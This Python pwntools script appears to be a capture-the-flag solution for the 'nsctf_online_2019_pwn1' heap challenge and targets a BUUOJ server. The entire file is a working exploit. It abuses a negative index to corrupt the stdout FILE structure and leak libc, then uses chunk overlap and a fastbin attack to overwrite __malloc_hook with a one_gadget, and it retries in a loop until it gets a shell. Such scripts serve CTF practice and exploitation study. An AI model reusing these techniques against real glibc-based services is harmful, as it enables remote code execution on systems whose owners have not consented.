import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	try :
		if len(sys.argv)==1 :
			# io=process('./p1KkHeap')
			io=process(['./nsctf_online_2019_pwn1'],env={'LD_PRELOAD':'/lib/x86_64-linux-gnu/libc.so.6'})
			elf=ELF('./nsctf_online_2019_pwn1')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',25258)
			elf=ELF('./nsctf_online_2019_pwn1')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add(a,b):
			io.sendlineafter('5.exit\n','1')
			io.sendlineafter('Input the size:\n',str(a))
			io.sendafter('Input the content:\n',b)

		def delete(a):
			io.sendlineafter('5.exit\n','2')
			io.sendlineafter('Input the index:\n',str(a))

		def edit(a,b,c):
			io.sendlineafter('5.exit\n','4')
			io.sendlineafter('Input the index:\n',str(a))
			io.sendlineafter('Input size:\n',str(b))
			io.sendafter('Input new content:\n',c)


		add(0x88,'0')
		add(0x38,'1')
		add(0x28,'2')
		add(0xf8,'3')
		add(0x18,'4')
		edit(-16,0x80,p64(0xfbad3887)+p64(0)*3+'\x88')
		libc_base=u64(io.recv(8))-libc.sym['_IO_2_1_stdin_']
		libc.address=libc_base
		edit(2,0x28,'\x00'*0x20+p64(0x100))
		delete(0)
		delete(3)
		add(0x1f8,'\x00'*0x88+p64(0x71)+'\x00'*0x68+p64(0x101))
		delete(1)
		delete(0)
		add(0x80,'\n')
		delete(0)
		add(0x1f8,'\x00'*0x88+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23)+'\x00'*0x60+p64(0x101))
		delete(0)
		add(0x68,'a')
		add(0x68,'\x00'*0x13+p64(libc_base+0xf1147))
		io.sendlineafter('5.exit\n','1')
		io.sendlineafter('Input the size:\n',str(1))

		
		# gdb.attach(io)
		# pause()
		io.interactive()

	except Exception as e:
		io.close()
		continue
	# else:
	# 	continue